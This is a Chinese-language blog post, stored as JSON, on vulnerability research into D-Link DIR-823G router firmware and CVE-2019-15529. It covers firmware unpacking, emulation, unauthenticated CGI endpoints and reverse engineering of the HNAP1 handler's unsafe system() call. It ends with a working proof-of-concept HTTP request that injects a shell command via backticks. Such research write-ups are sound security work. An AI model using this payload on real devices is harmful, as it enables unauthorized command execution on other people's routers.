{"title":"Dlink DIR-823G 漏洞挖掘过程","slug":"Dlink-Dir-823G路由器漏洞挖掘过程","date":"2020-10-16","updated":"2020-09-24","comments":true,"path":"api/posts/39342.json","excerpt":null,"cover":"https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png","covers":["https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png","https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png","https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png","https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png","https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png","https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png","https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png","https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png","https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png"],"content":"<p>固件下载地址： <a href=\"https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA</a> 提取码：1ly1</p>\n<h1 id=\"0x01- 漏洞介绍\"><a href=\"#0x01- 漏洞介绍\" class=\"headerlink\" title=\"0x01 漏洞介绍\"></a>0x01 漏洞介绍</h1><p><b>D-Link DIR-823G 命令注入漏洞：</b></p>\n<p>CVE 编号：CVE-2019-15529</p>\n<p>D-Link DIR-823G 是中国台湾友讯（D-Link）公司的一款无线路由器。使用 1.0.2B05 版本固件的 D-Link DIR-823G 中的 HNAP1 存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 </p>\n<h1 id=\"0x02- 分析\"><a href=\"#0x02- 分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析</h1><ul>\n<li>binwalk -Me 固件.bin // 解开固件</li>\n</ul>\n<p><img src=\"https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png\" alt=\"捕获.PNG\"></p>\n<p>是一个 squashfs 文件系统，标准 linux 目录结构。</p>\n<ul>\n<li>cat /etc/init.d/rcS // 查看路由器开启的服务。</li>\n</ul>\n<p>发现一个 goahead 进程。</p>\n<blockquote>\n<p>GoAhead(嵌入式 Web 服务器)，GoAhead 自身实现一个 web 服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括 asp 过程、goforms 过程。用户定制型非常强，可通过 goaead 的 api 定义 url 处理函数和可供 asp 文件中调用的函数。<br><code>websUrlHandlerDefine(T(&quot;/goform&quot;), NULL, 0, websFormHandler, 0);</code> /goform 的请求交给 websFormHandler 函数处理<br><code>websUrlHandlerDefine(T(&quot;/cgi-bin&quot;), NULL, 0, websCgiHandler, 0);</code> /cgi-bin 的请求交给 websCgiHandler 函数处理。</p>\n</blockquote>\n<h2 id=\"模拟运行固件\"><a href=\"# 模拟运行固件\" class=\"headerlink\" title=\"模拟运行固件\"></a>模拟运行固件 </h2><p> 环境使用工具 firmware-ayalysis-toolkit。</p>\n<p>搭建教程：<a href=\"https://zhuanlan.zhihu.com/p/110806057\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/110806057</a></p>\n<p>运行起来后 nmap 扫端口，发现开了 http 服务和 dns 服务。</p>\n<p>访问<a href=\"http://192.168.0.1, 可看到 Dlink 登录页面。要求用户做一些设置，不需要密码即可登录。\" target=\"_blank\" rel=\"noopener\">http://192.168.0.1, 可看到 Dlink 登录页面。要求用户做一些设置，不需要密码即可登录。</a></p>\n<p><img src=\"https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png\" alt=\"捕获.PNG\"></p>\n<p>在固件解压的文件下找到名为 web_mtn 的文件，应该是 web 目录。其中 cgi-bin 目录下存放的 cgi 文件可以非授权访问，可能造成影响。</p>\n<h2 id=\"未授权访问\"><a href=\"# 未授权访问\" class=\"headerlink\" title=\"未授权访问\"></a>未授权访问</h2><p><b><code>/cgi-bin/ExportSettings.sh</code> 导出配置文件，造成信息泄露。</b></p>\n<p><img src=\"https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png\" alt=\"捕获.PNG\"></p>\n<p><b><code>/cgi-bin/upload_settings.cgi</code> 导入配置文件，可导入恶意篡改后的配置。</b></p>\n<p><img src=\"https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png\" alt=\"捕获.PNG\"></p>\n<p><b><code>/cgi-bin/GetDownLoadSyslog.sh</code> 获取系统部分启动信息<code>/var/log/messages*</code></b></p>\n<p><img src=\"https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png\" alt=\"捕获.PNG\"></p>\n<p><b><code>/cgi-bin/upload_firmware.cgi</code> 上传更新固件，可恶意修改固件</b></p>\n<h2 id=\"goahead- 自定义的请求处理函数\"><a href=\"#goahead- 自定义的请求处理函数\" class=\"headerlink\" title=\"goahead 自定义的请求处理函数\"></a>goahead 自定义的请求处理函数</h2><blockquote>\n<p>处理函数的参数列表：<br>int websCgiHandler(webs_t wp, char_t <em>urlPrefix, char_t *webDir, int arg, char_t *url, char_t *path, char_t</em> query)<br>goForms 过程: 它主要用来响应用户输入以更新系统设置或者执行特定的动作。在 GoAhead 中，goForms 实现为一个 URL 处理器，它会解释以”/goform”开始的 URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节.</p>\n</blockquote>\n<p>IDA 打开 goahead 分析：</p>\n<p>通过字符串 /cgi-bin 或 /goform 找到定义 url 的函数位置。交叉引用，发现注册处理函数位置为 0x42424C.</p>\n<p><img src=\"https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png\" alt=\"捕获.PNG\"></p>\n<p>websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。</p>\n<p>抓取登录数据包，发现往 /HNAP1 发送。</p>\n<p><img src=\"https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png\" alt=\"捕获.PNG\"></p>\n<p>分析 /HNAP1（0x42383C）处理函数逻辑:</p>\n<p><img src=\"https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png\" alt=\"捕获.PNG\"></p>\n<p>从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。</p>\n<p>找到需要调用的处理函数后，会首先记录 POST 原始报文。这里记录日志首先是用 snprintf 生成命令，然后 system 执行。</p>\n<p><img src=\"https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png\" alt=\"捕获.PNG\"></p>\n<p>此处可以直接注入’来命令执行。</p>\n<blockquote>\n<p>在 PHP 中常用到以下几个函数来执行外部命令:<br>system</p>\n<blockquote>\n<p>system()函数能够将字符串作为 OS 命令执行，并自带输出到当前页面的功能</p>\n</blockquote>\n<p>exec<br>passthru<br>shell_exec</p>\n</blockquote>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST &#x2F;HNAP1&#x2F; HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.0.1</span><br><span class=\"line\">Content-Length: 53</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36</span><br><span class=\"line\">Content-Type: text&#x2F;xml; charset&#x3D;UTF-8</span><br><span class=\"line\">Accept: *&#x2F;*</span><br><span class=\"line\">SOAPAction: &quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;Login&quot;</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">&#39;&#96;echo hacked_by_hac425!!!!!!!! &gt; &#x2F;web_mtn&#x2F;hack.txt&#96;&#39;</span><br></pre></td></tr></table></figure>\n\n","url":"/posts/39342/","min2read":3,"word4post":961,"prev_post":{"title":"JIT 学习","url":"/posts/17972/"},"next_post":{"title":"DDCTF RE windows_re2","url":"/posts/2874/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" data-id=\"0x01- 漏洞介绍\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">0x01 漏洞介绍</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" data-id=\"0x02- 分析\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">0x02 分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"模拟运行固件\" href = \"#\"><span class=\"toc-number\">2.1.</span> <span class=\"toc-text\">模拟运行固件 </span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"未授权访问\" href = \"#\"><span class=\"toc-number\">2.2.</span> <span class=\"toc-text\">未授权访问</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"goahead- 自定义的请求处理函数\" href = \"#\"><span class=\"toc-number\">2.3.</span> <span class=\"toc-text\">goahead 自定义的请求处理函数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"POC\" href = \"#\"><span class=\"toc-number\">2.4.</span> <span class=\"toc-text\">POC</span></a></li></ol></li></ol>","categories":[],"tags":[{"name":"IOT","path":"api/tags/IOT.json","url":"/tags/IOT/"}]}